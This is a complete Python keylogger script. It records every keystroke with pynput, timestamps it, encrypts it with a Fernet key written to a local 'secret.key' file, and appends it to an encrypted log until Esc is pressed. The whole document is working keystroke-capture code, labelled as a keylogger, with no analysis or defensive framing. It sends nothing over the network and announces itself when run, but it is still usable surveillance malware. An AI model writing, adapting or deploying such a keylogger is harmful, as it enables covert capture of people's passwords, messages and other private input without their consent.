import pynput.keyboard
from cryptography.fernet import Fernet
import time
import os

key = Fernet.generate_key()
cipher = Fernet(key)

log_file = "encrypted_log.txt"
encryption_key_file = "secret.key"

with open(encryption_key_file, "wb") as f:
    f.write(key)

def write_to_file(data):
    """Encrypts and appends data to the log file."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_data = f"[{timestamp}] {data}"
    

    encrypted_data = cipher.encrypt(formatted_data.encode())
    
    with open(log_file, "ab") as f:
        f.write(encrypted_data + b"\n")

def on_press(key):
    
    try:
        write_to_file(str(key.char))
    except AttributeError:
        write_to_file(str(key))

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        print("\n[!] Kill switch activated. Exiting...")
        return False

print(f"[+] Keylogger started. Logs are being encrypted to {log_file}")
print("[+] Press 'Esc' to stop.")

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()